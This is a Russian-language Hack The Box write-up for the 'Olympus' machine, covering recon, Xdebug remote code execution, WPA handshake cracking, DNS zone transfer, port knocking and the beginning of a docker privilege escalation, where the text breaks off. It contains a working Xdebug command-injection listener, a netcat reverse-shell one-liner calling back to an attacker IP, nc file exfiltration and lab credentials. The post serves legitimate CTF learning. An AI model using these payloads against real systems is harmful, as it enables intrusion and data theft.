---
layout: post
title: "HTB{ Olympus }"
date: 2018-10-03 20:00:00 +0300
author: snovvcrash
categories: /pentest
tags: [write-up, hackthebox, linux, nikto, xdebug, reverse-shell, aircrack-ng, airgeddon, dns-zone-transfer, dns-axfr, port-knocking, docker, metasploit]
comments: true
published: true
---

Путешествие к вершинам **Олимпа**: 1. Остров Крит — веб-сервер Apache с RCE-уязвимостью в Xdebug; 2. Олимпия — докер-контейнер с таском на брут 802.11 WPA перехвата; 3. Остров Родос — DNS-сервер, хранящий последовательность портов к Port Knocking'у для открытия портала в царство Аида; 4. Царство Аида — последний этап, сама виртуальная машина Olympus, root-сессия будет получена через захват docker'а. А теперь подробнее...

<!--cut-->

**5.3/10**
{: style="color: orange; text-align: right;"}

[![banner.png](/assets/images/htb/machines/olympus/banner.png)](https://www.hackthebox.eu/home/machines/profile/135 "Hack The Box :: Olympus")
{: .center-image}

![info.png](/assets/images/htb/machines/olympus/info.png)
{: .center-image}

* TOC
{:toc}

# Разведка
## Nmap
Initial:
```text
root@kali:~# nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.83
...
```

```text
root@kali:~# cat nmap/initial.nmap
# Nmap 7.70 scan initiated Sun Sep 30 14:07:54 2018 as: nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.83
Increasing send delay for 10.10.10.83 from 0 to 5 due to 167 out of 555 dropped probes since last increase.
Nmap scan report for 10.10.10.83
Host is up, received user-set (0.052s latency).
Scanned at 2018-09-30 14:07:54 EDT for 1s
Not shown: 996 closed ports
Reason: 996 resets
PORT     STATE    SERVICE      REASON
22/tcp   filtered ssh          no-response
53/tcp   open     domain       syn-ack ttl 62
80/tcp   open     http         syn-ack ttl 62
2222/tcp open     EtherNetIP-1 syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Sep 30 14:07:55 2018 -- 1 IP address (1 host up) scanned in 0.55 seconds
```

Version ([красивый отчет](/assets/reports/nmap/htb/olympus/version.html)):
```text
root@kali:~# nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/reports/nmap/nmap-bootstrap.xsl -p53,80,2222 10.10.10.83
...
```

```text
root@kali:~# cat nmap/version.nmap
# Nmap 7.70 scan initiated Sun Sep 30 14:08:02 2018 as: nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/reports/nmap/nmap-bootstrap.xsl -p53,80,2222 10.10.10.83
Nmap scan report for 10.10.10.83
Host is up, received reset ttl 63 (0.049s latency).
Scanned at 2018-09-30 14:08:03 EDT for 24s

PORT     STATE SERVICE REASON         VERSION
53/tcp   open  domain  syn-ack ttl 62 (unknown banner: Bind)
| dns-nsid: 
|_  bind.version: Bind
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    Bind
80/tcp   open  http    syn-ack ttl 62 Apache httpd
|_http-favicon: Unknown favicon MD5: 399EAE2564C19BD20E855CDB3C0C9D1B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Crete island - Olympus HTB
2222/tcp open  ssh     syn-ack ttl 62 (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-City of olympia
| ssh-hostkey: 
|   2048 f2:ba:db:06:95:00:ec:05:81:b0:93:60:32:fd:9e:00 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCohNsiG9F7o0LDtwsBg/e+/wmnvepC5grY6lbmsSPVpFgEckWVAqzxk14cLSrD2FUWL3K1YXN/aA9CVE3lZXZAS+NLArEcX3qCUwLV1Oz0Foypq0xMmE8jla7YhHGn5ejxPSLwOZv7UezC5kWpGHQBlM/6FIFnUgH000vDg+88mdUL5bibA1DZbV6HWS3DvP2nW4UAv7opOJacwkh/hdU+NZ9Ztn5ifrjsHBb9plFAUY3DoqDNhZ/3D70oyBmzT12/alBL/gpFQC6hHZkf4ljHA8He0IdN3kohX1Fwt/dppYRTbfMsPDFgRxJ07c8uknEax71PQaSgL9VqOZ+BfOLD
|   256 79:90:c0:3d:43:6c:8d:72:19:60:45:3c:f8:99:14:bb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGT58ZASVhHjRcHlNFWjmC7p0mf9hcGv7L970l+lT/X9INrsBpOpduOaf93G4L4LMNuDNzhMFIFAFFQS6JL5uwA=
|   256 f8:5b:2e:32:95:03:12:a3:3b:40:c5:11:27:ca:71:52 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHovT0TzbV0tvldAQEx/5i+4kFYDBVFbVF/6q1SuAJ5O
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.70%I=7%D=9/30%Time=5BB1110E%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,3F,"\0=\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x05\x04Bind\xc0\x0c\
SF:0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.70%I=7%D=9/30%Time=5BB11109%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29,"SSH-2\.0-City\x20of\x20olympia\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\r\n");

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 30 14:08:27 2018 -- 1 IP address (1 host up) scanned in 25.08 seconds
```

Необычная картина: SSH на 2222-м и 22-м портах (причем 22-й фильтруется), DNS на 53-м TCP (подчеркиваю, **TCP**, что может означать, что DNS-сервер поддерживает запросы на трансфер зоны), и веб-сервер на 80-м порту. Для начала попробуем вытащить что-нибудь внятное из DNS'а.

# DNS — Порт 53 (TCP). Попытка № 1
Первым пойдет AXFR-запрос (Full Zone Transfer), как кандидат на получение зоны DNS:
```text
root@kali:~# dig axfr @10.10.10.83 olympus.htb

; <<>> DiG 9.11.4-P2-3-Debian <<>> axfr @10.10.10.83 olympus.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

Ничего полезного. Просто информация о домене?
```text
root@kali:~# dig @10.10.10.83 olympus.htb

; <<>> DiG 9.11.4-P2-3-Debian <<>> @10.10.10.83 olympus.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 46567
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;olympus.htb.                   IN      A

;; Query time: 22 msec
;; SERVER: 10.10.10.83#53(10.10.10.83)
;; WHEN: Mon Oct 01 13:40:54 EDT 2018
;; MSG SIZE  rcvd: 40
```

Тоже ничего. Перейдем к чему-то более вразумительному, а именно к исследованию веб-сервера.

# Web — Порт 80 [остров Крит]
Добро пожаловать на остров Крит:

[![port80-browser-1.png](/assets/images/htb/machines/olympus/port80-browser-1.png)](/assets/images/htb/machines/olympus/port80-browser-1.png)
{: .center-image}

В исходниках пусто:
```html
<!-- view-source:http://10.10.10.83/ -->

<!DOCTYPE HTML>
	<html>
	<head>
		<title>Crete island - Olympus HTB</title>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
		<link rel="shortcut icon" href="favicon.ico">
		<link rel="stylesheet" type="text/css" href="crete.css">
	</head>
	<body class="crete">
	</body>
	</html>
```

И ничего больше...

## nikto
Признаться, здесь я пробыл некоторое время (изображение Зевса на стего-тулзы не откликается)... Пока не отработал `nikto` :smiling_imp:
```text
root@kali:~# nikto -h http://10.10.10.83:80 -o nikto/olympus.txt
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.83
+ Target Port: 80
+ GET Uncommon header 'xdebug' found, with contents: 2.5.5
+ ZLVHTRSC Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3233: GET /icons/README: Apache default file found.
```

Взгляд тут же остановился на обнаруженном заголовке `xdebug`.

То же самое можно увидеть, просмотрев заголовки HTTP-ответа:

[![port80-browser-2.png](/assets/images/htb/machines/olympus/port80-browser-2.png)](/assets/images/htb/machines/olympus/port80-browser-2.png)
{: .center-image}

На задворках сознания начали всплывать китайские иероглифы, ибо как-то раз я наткнулся на китайскую публикация, описывающую элегантную атаку, основанную на этой фиче для веб-девелоперов.

Я решил проверить чувства и набрал:
```text
root@kali:~# searchsploit xdebug
----------------------------------------------------- ----------------------------------------
 Exploit Title                                       |  Path
                                                     | (/usr/share/exploitdb/)
----------------------------------------------------- ----------------------------------------
xdebug < 2.5.5 - OS Command Execution (Metasploit)   | exploits/php/remote/44568.rb
----------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

А перекрестные ссылки от этого эксплойта в поисковике привели на ту самую китайскую ~~теорему об остатках~~ [статью](https://paper.seebug.org/397 "Xdebug: A Tiny Attack Surface"). Хочу обратить внимание, что эта уязвимость с гораздо бо́льшим комфортом эксплуатируется через Metasploit (там тебе и meterpreter, и все такое), однако мы посмотрим, как раскрутить механизм атаки вручную.

## Эксплуатация Xdebug
Пара слов о виновнике торжества:
> **Xdebug** — это расширения для PHP, которое позволяет максимально возможно упростить отладку PHP-скриптов и добавить в разработку на PHP таких удобств, как точки останова, пошаговое выполнение, наблюдение за выражениями и др.

Конечно, "законные" отладчики выполнены в виде красивых обвесов для IDE и плагинов на браузеры, но мы наведем здесь порядок — только кислотно-зеленые буквы на аспидно-черном фоне терминала :neckbeard:

От гугл переводчика толку мало, да перевод особенно не требуется — по скриншотам из статьи легко прослеживает структура атаки. Сперва попробуем просто принять 2 ICMP-пакета в качестве PoC'а, дальше будем собирать шелл.

### Proof-of-Concept
1\. Первым шагом запускается Python-скрипт, слушающий дефолтный для Xdebug'а 9000-й порт:
```python
#!/usr/bin/python2
import socket

ip_port = ('0.0.0.0', 9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    data = raw_input('>> ')
    conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
```

```text
root@kali:~# python olympus_shell.py

```

Тем самым мы готовимся перехватить коннект на скрипт и уйти в бесконечный цикл выполнения команд.

2\. Далее с помощью `curl` триггерится вполне легитимная (в теории) debug-сессия и мгновенно улетает на поднятый ранее листенер:
```text
root@kali:~# curl -H 'X-Forwarded-For: 10.10.13.180' 'http://10.10.10.83/index.php?XDEBUG_SESSION_START=phpstorm'

```

3\. После чего оживляется скучающий Python-скрипт. Пингуем нашу машину:
```text
root@kali:~# python olympus_shell.py
486<?xml version="1.0" encoding="iso-8859-1"?>
<init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" fileuri="file:///var/www/html/index.php" language="PHP" xdebug:language_version="7.1.12" protocol_version="1.0" appid="17" idekey="phpstorm"><engine version="2.5.5"><![CDATA[Xdebug]]></engine><author><![CDATA[Derick Rethans]]></author><url><![CDATA[http://xdebug.org]]></url><copyright><![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]></copyright></init>
>> system('ping -c 2 10.10.14.14')
336<?xml version="1.0" encoding="iso-8859-1"?>
<response xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" command="eval" transaction_id="1"><property type="string" size="61" encoding="base64"><![CDATA[cm91bmQtdHJpcCBtaW4vYXZnL21heC9zdGRkZXYgPSA2OC4wMDEvNjguMzQ2LzY4LjY5MC8wLjM0NSBtcw==]]></property></response>
```

Ловим отчет об удачном пинге на поднятом на фоне tcpdump'е, а также получаем похожее сообщение об успехе операции от процесса, где бежит curl:
```text
root@kali:~# tcpdump -v -i tun0 'icmp[icmptype]==8'
tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
16:02:34.256845 IP (tos 0x0, ttl 62, id 57110, offset 0, flags [DF], proto ICMP (1), length 84)
    10.10.10.83 > kali: ICMP echo request, id 153, seq 0, length 64
16:02:35.242676 IP (tos 0x0, ttl 62, id 57292, offset 0, flags [DF], proto ICMP (1), length 84)
    10.10.10.83 > kali: ICMP echo request, id 153, seq 1, length 64
```

```text
root@kali:~# curl -H 'X-Forwarded-For: 10.10.14.14' 'http://10.10.10.83/index.php?XDEBUG_SESSION_START=phpstorm'
64 bytes from 10.10.14.14: icmp_seq=0 ttl=62 time=68.001 ms
64 bytes from 10.10.14.14: icmp_seq=1 ttl=62 time=68.690 ms
--- 10.10.14.14 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max/stddev = 68.001/68.346/68.690/0.345 ms
```

Обратим внимание на base64-свойство `CDATA` (на 2 code-секции выше), которое при декодирование даст:
```text
root@kali:~# base64 -d <<< 'cm91bmQtdHJpcCBtaW4vYXZnL21heC9zdGRkZXYgPSA2OC4wMDEvNjguMzQ2LzY4LjY5MC8wLjM0NSBtcw=='
round-trip min/avg/max/stddev = 68.001/68.346/68.690/0.345 ms
```

В красках все выглядело так (красные числа — порядок активности панелей):

[![xdebug-exploit-poc.png](/assets/images/htb/machines/olympus/xdebug-exploit-poc.png)](/assets/images/htb/machines/olympus/xdebug-exploit-poc.png)
{: .center-image}

На этом считаю тест успешно завершенным, можно переходить к боевым действиям.

### Reverse-Shell [Олимпия]
Для получения сессии повторим операцию выше, только на этот раз в качестве пейлоада для Xdebug укажем bash-реверс-шелл:
```text
...
>> system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 31337 >/tmp/f')
...
```

Ии ловим ответ:
```text
root@kali:~# nc -nlvvp 31337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.10.10.83.
Ncat: Connection from 10.10.10.83:54230.

/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ uname -a
Linux f00ba96171c5 4.9.0-6-amd64 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) x86_64 GNU/Linux
```

Чтобы не мучить тебя долгими листингами, скажу на словах: нужно было погулять по файловой системе и наткнуться на каталог `/home/zeus/airgeddon/captured`:
```text
$ ls -la /home/zeus/airgeddon/
total 1100
drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 .
drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..
-rw-r--r-- 1 zeus zeus    264 Apr  8 00:58 .editorconfig
drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 .git
-rw-r--r-- 1 zeus zeus    230 Apr  8 00:58 .gitattributes
drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 .github
-rw-r--r-- 1 zeus zeus     89 Apr  8 00:58 .gitignore
-rw-r--r-- 1 zeus zeus  15855 Apr  8 00:58 CHANGELOG.md
-rw-r--r-- 1 zeus zeus   3228 Apr  8 00:58 CODE_OF_CONDUCT.md
-rw-r--r-- 1 zeus zeus   6358 Apr  8 00:58 CONTRIBUTING.md
-rw-r--r-- 1 zeus zeus   3283 Apr  8 00:58 Dockerfile
-rw-r--r-- 1 zeus zeus  34940 Apr  8 00:58 LICENSE.md
-rw-r--r-- 1 zeus zeus   4425 Apr  8 00:58 README.md
-rw-r--r-- 1 zeus zeus 297711 Apr  8 00:58 airgeddon.sh
drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 binaries
drwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 captured
drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 imgs
-rw-r--r-- 1 zeus zeus  16315 Apr  8 00:58 known_pins.db
-rw-r--r-- 1 zeus zeus 685345 Apr  8 00:58 language_strings.sh
-rw-r--r-- 1 zeus zeus     33 Apr  8 00:58 pindb_checksum.txt

$ cd captured

$ ls -la
total 304
drwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 .
drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..
-rw-r--r-- 1 zeus zeus 297917 Apr  8 12:48 captured.cap
-rw-r--r-- 1 zeus zeus     57 Apr  8 17:30 papyrus.txt
```

```text
$ cat papyrus.txt
Captured while flying. I'll banish him to Olympia - Zeus
```

```text
$ file captured.cap
captured.cap: tcpdump capture file (little-endian) - version 2.4 (802.11, capture length 65535)
```

`airgeddon` — это такой bash-скрипт (от создателя бокса, кстати), который автоматизирует аудит беспроводных сетей (в основном позволяет легче управляться с `aircrack-ng`), поэтому нетрудно догадаться, что предстоит делать дальше.

Забираем дамп трафика к себе на машину (вспоминая, как было бы удобно сделать это в один клик из-под meterpreter-сессии):
```text
$ nc -w3 10.10.14.14 8888 < captured/captured.cap
```

```text
root@kali:~# nc -nlvvp 8888 > captured.cap
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.83.
Ncat: Connection from 10.10.10.83:36924.
NCAT DEBUG: Closing fd 5.
```

И повозимся немного с ним.

### Ломаем 802.11 WPA
Чтобы узнать имя беспроводной сети (ESSID), можно открыть дамп Wireshark'ом или же просто прогнать на нем aircrack-ng без параметров:
```text
root@kali:~# aircrack-ng captured.cap
Opening captured.cap
Read 6498 packets.

   #  BSSID              ESSID                     Encryption

   1  F4:EC:38:AB:A8:A9  Too_cl0se_to_th3_Sun      WPA (1 handshake)
...
```

После чего запускаем aircrack-ng уже непосредственно для взлома пароля сетки `Too_cl0se_to_th3_Sun`:
```text
root@kali:~# aircrack-ng -e 'Too_cl0se_to_th3_Sun' -w /usr/share/wordlists/rockyou.txt captured.cap
...
[00:20:20] 5305860/9822768 keys tested (4398.83 k/s)

      Time left: 17 minutes, 7 seconds                          54.02%

                        KEY FOUND! [ flightoficarus ]


      Master Key     : FA C9 FB 75 B7 7E DC 86 CC C0 D5 38 88 75 B8 5A
                       88 3B 75 31 D9 C3 23 C8 68 3C DB FA 0F 67 3F 48

      Transient Key  : 46 7D FD D8 1A E5 1A 98 50 C8 DD 13 26 E7 32 7C
                       DE E7 77 4E 83 03 D9 24 74 81 30 84 AD AD F8 10
                       21 62 1F 60 15 02 0C 5C 1C 84 60 FA 34 DE C0 4F
                       35 F6 4F 03 A2 0F 8F 6F 5E 20 05 27 E1 73 E0 73

      EAPOL HMAC     : AC 1A 73 84 FB BF 75 9C 86 CF 5B 5A F4 8A 4C 38
...
```

На сей процесс на Kali-виртуалке ушло около получаса.

Дальше "guessing" техникой или методологией "научного тыка в сферического коня в вакууме" определяем, что `icarus:Too_cl0se_to_th3_Sun` — креды для подключения к машине по 2222-му SSH порту (имя пользователя пришлось и вправду **угадывать**: как видишь, оказалось, что пароль от Wi-Fi'я лишь *содержал* имя пользователя, а не *являлся* им :neutral_face:).

# SSH — Порт 2222
```text
root@kali:~# sshpass -p 'Too_cl0se_to_th3_Sun' ssh -oStrictHostKeyChecking=no -p 2222 icarus@10.10.10.83
icarus@620b296204a3:~$ whoami
icarus

icarus@620b296204a3:~$ id
uid=1000(icarus) gid=1000(icarus) groups=1000(icarus)

icarus@620b296204a3:~$ uname -a
Linux 620b296204a3 4.9.0-6-amd64 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) x86_64 x86_64 x86_64 GNU/Linux

icarus@620b296204a3:~$ ls -la
total 32
drwxr-xr-x 1 icarus icarus 4096 Apr 15 21:50 .
drwxr-xr-x 1 root   root   4096 Apr  8 11:59 ..
-rw------- 1 icarus icarus   33 Apr 15 16:47 .bash_history
-rw-r--r-- 1 icarus icarus  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 icarus icarus 3771 Aug 31  2015 .bashrc
drwx------ 2 icarus icarus 4096 Apr 15 16:44 .cache
-rw-r--r-- 1 icarus icarus  655 May 16  2017 .profile
-rw-r--r-- 1 root   root     85 Apr 15 21:50 help_of_the_gods.txt
```

```text
icarus@620b296204a3:~$ cat help_of_the_gods.txt

Athena goddess will guide you through the dark...

Way to Rhodes...
ctfolympus.htb
```

`help_of_the_gods.txt` — все, что нам понадобится от этого соединения (к слову, очередной докер-контейнер).

# DNS — Порт 53 (TCP). Попытка № 2 [остров Родос]
Теперь мы знаем, в сторону какого домена *копать* :wink:
```text
root@kali:~# dig axfr @10.10.10.83 ctfolympus.htb

; <<>> DiG 9.11.4-P2-3-Debian <<>> axfr @10.10.10.83 ctfolympus.htb
; (1 server found)
;; global options: +cmd
ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
ctfolympus.htb.         86400   IN      TXT     "prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
ctfolympus.htb.         86400   IN      A       192.168.0.120
ctfolympus.htb.         86400   IN      NS      ns1.ctfolympus.htb.
ctfolympus.htb.         86400   IN      NS      ns2.ctfolympus.htb.
ctfolympus.htb.         86400   IN      MX      10 mail.ctfolympus.htb.
crete.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
hades.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
mail.ctfolympus.htb.    86400   IN      A       192.168.0.120
ns1.ctfolympus.htb.     86400   IN      A       192.168.0.120
ns2.ctfolympus.htb.     86400   IN      A       192.168.0.120
rhodes.ctfolympus.htb.  86400   IN      CNAME   ctfolympus.htb.
RhodesColossus.ctfolympus.htb. 86400 IN TXT     "Here lies the great Colossus of Rhodes"
www.ctfolympus.htb.     86400   IN      CNAME   ctfolympus.htb.
ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
;; Query time: 58 msec
;; SERVER: 10.10.10.83#53(10.10.10.83)
;; WHEN: Wed Oct 03 09:20:03 EDT 2018
;; XFR size: 15 records (messages 1, bytes 475)
```

Мы прибыли на остров Родос, и здесь, по моему мнению, начинается самая интересная часть прохождения:

```text
"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
```

Тут окей, более-менее понятно: `prometheus:St34l_th3_F1re!` — авторизационные данные для какого-то сервиса, но вот, что за магические числа `3456 8234 62431`? Ответ тривиален, если знать два ключевых слова: "Port Knocking".

# Port Knocking
Если верить [Вики](https://en.wikipedia.org/wiki/Port_knocking "Port knocking - Wikipedia"), то

> In computer networking, **port knocking** is a method of externally opening ports on a firewall by generating a connection attempt on a set of prespecified closed ports. Once a correct sequence of connection attempts is received, the firewall rules are dynamically modified to allow the host which sent the connection attempts to connect over specific port(s).

По-русски это означает следующее: **port knocking** — техника защиты портов от чужаков; в случае ее применения для подключения к порту необходимо простучать (отправить запросы на) предопределенную серию портов в нужной последовательности; при успешном выполнении вышеописанного действа целевой порт, скрытый ранее за файерволом, откроет свои объятия и станет доступен для подключения на короткий промежуток времени. За подробностями рекомендую ознакомится с серией публикаций в 3-х частях: [первая](http://blogerator.org/page/pozadi-zakrytyh-dverej-port-knocking-bezopasnost-dostupa-knockd-zaschita-ssh-1 "Позади закрытых дверей: Port knocking. Часть 1"), [вторая](http://blogerator.org/page/pozadi-dverej-port-knosking-skrytyj-setevoj-dostup-portknocking-pk-2 "Позади закрытых дверей: Port knoсking. Часть 2"), [третья](http://blogerator.org/page/pozadi-dverej-port-knocking-security-obscurity-zashhita-ssh-tariq-3 "Позади закрытых дверей: Port knoсking. Часть 3").

# SSH — Порт 22 (внутри машины) [царство Аида]
Теперь настало время вспомнить о фильтруемом 22-м SSH порте и попросить Сим-сим открыться.

Благо, сделать это можно разными способами.

1\. С помощью специализированной утилиты [knock](https://github.com/jvinet/knock "jvinet/knock: A port-knocking daemon") (которую предварительно нужно установить, разумеется):
```text
root@kali:~# knock 10.10.10.83 3456:tcp 8234:tcp 62431:tcp && sshpass -p 'St34l_th3_F1re!' ssh -oStrictHostKeyChecking=no prometheus@10.10.10.83

Welcome to

    )         (
 ( /(     )   )\ )   (
 )\()) ( /(  (()/(  ))\ (
((_)\  )(_))  ((_))/((_))\
| |(_)((_)_   _| |(_)) ((_)
| ' \ / _` |/ _` |/ -_)(_-<
|_||_|\__,_|\__,_|\___|/__/

```

2\. С помощью любимого nmap'а, указав "вежливую" скорость сканирования (`-T polite` == `-T 2`):
```text
root@kali:~# nmap -n -v -Pn --host-timeout 251 --max-retries 0 -T polite -p3456,8234,62431 10.10.10.83 && sshpass -p 'St34l_th3_F1re!' ssh -oStrictHostKeyChecking=no prometheus@10.10.10.83
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-03 11:19 EDT
Initiating SYN Stealth Scan at 11:19
Scanning 10.10.10.83 [3 ports]
Completed SYN Stealth Scan at 11:19, 1.28s elapsed (3 total ports)
Nmap scan report for 10.10.10.83
Host is up (0.058s latency).

PORT      STATE  SERVICE
3456/tcp  closed vat
8234/tcp  closed unknown
62431/tcp closed unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.34 seconds
           Raw packets sent: 3 (132B) | Rcvd: 3 (120B)

Welcome to

    )         (
 ( /(     )   )\ )   (
 )\()) ( /(  (()/(  ))\ (
((_)\  )(_))  ((_))/((_))\
| |(_)((_)_   _| |(_)) ((_)
| ' \ / _` |/ _` |/ -_)(_-<
|_||_|\__,_|\__,_|\___|/__/

```

3\. С помощью комбинации любимого nmap'а и пары директив шелл-скриптинга:
```text
root@kali:~# for i in 3456 8234 62431; do nmap -n -v -Pn --host-timeout 251 --max-retries 0 -p $i 10.10.10.83 && sleep 1; done && sshpass -p 'St34l_th3_F1re!' ssh -oStrictHostKeyChecking=no prometheus@10.10.10.83
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-03 11:20 EDT
Initiating SYN Stealth Scan at 11:20
Scanning 10.10.10.83 [1 port]
Completed SYN Stealth Scan at 11:20, 0.09s elapsed (1 total ports)
Nmap scan report for 10.10.10.83
Host is up (0.058s latency).

PORT     STATE  SERVICE
3456/tcp closed vat

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (40B)
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-03 11:20 EDT
Initiating SYN Stealth Scan at 11:20
Scanning 10.10.10.83 [1 port]
Completed SYN Stealth Scan at 11:20, 0.11s elapsed (1 total ports)
Nmap scan report for 10.10.10.83
Host is up (0.061s latency).

PORT     STATE  SERVICE
8234/tcp closed unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (40B)
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-03 11:20 EDT
Initiating SYN Stealth Scan at 11:20
Scanning 10.10.10.83 [1 port]
Completed SYN Stealth Scan at 11:20, 0.10s elapsed (1 total ports)
Nmap scan report for 10.10.10.83
Host is up (0.058s latency).

PORT      STATE  SERVICE
62431/tcp closed unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (40B)

Welcome to

    )         (
 ( /(     )   )\ )   (
 )\()) ( /(  (()/(  ))\ (
((_)\  )(_))  ((_))/((_))\
| |(_)((_)_   _| |(_)) ((_)
| ' \ / _` |/ _` |/ -_)(_-<
|_||_|\__,_|\__,_|\___|/__/

```

Итог один — мы внутри:
```text
Welcome to

    )         (
 ( /(     )   )\ )   (
 )\()) ( /(  (()/(  ))\ (
((_)\  )(_))  ((_))/((_))\
| |(_)((_)_   _| |(_)) ((_)
| ' \ / _` |/ _` |/ -_)(_-<
|_||_|\__,_|\__,_|\___|/__/

prometheus@olympus:~$ whoami
prometheus

prometheus@olympus:~$ id
uid=1000(prometheus) gid=1000(prometheus) groups=1000(prometheus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth),999(docker)

prometheus@olympus:~$ uname -a
Linux olympus 4.9.0-6-amd64 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) x86_64 GNU/Linux
```

И уже в этих неизменных трех первых строчках содержится ответ на извечный PrivEsc-вопрос:

:exclamation: DOCKER :exclamation:

## user.txt
Заберем только для начала флаг пользователя:
```text
prometheus@olympus:~$ cat /home/prometheus/user.txt
8aa18519????????????????????????
```

## PrivEsc: prometheus → root. Способ 1
Первый способ получения рут-сессии очень простой (по крайней мере, если ты прежде сталкивался с docker'ом).

Посмотрим доступные образы (ради интереса):
```text
prometheus@olympus:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
crete               latest              31be8149528e        5 months ago        450MB
olympia             latest              2b8904180780        5 months ago        209MB
rodhes              latest              82fbfd61b8c1        5 months ago        215MB
```

Выведем список контейнеров:
```text
prometheus@olympus:~$ docker container ls
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                    NAMES
f00ba96171c5        crete               "docker-php-entrypoi…"   5 months ago        Up 16 minutes       0.0.0.0:80->80/tcp                       crete
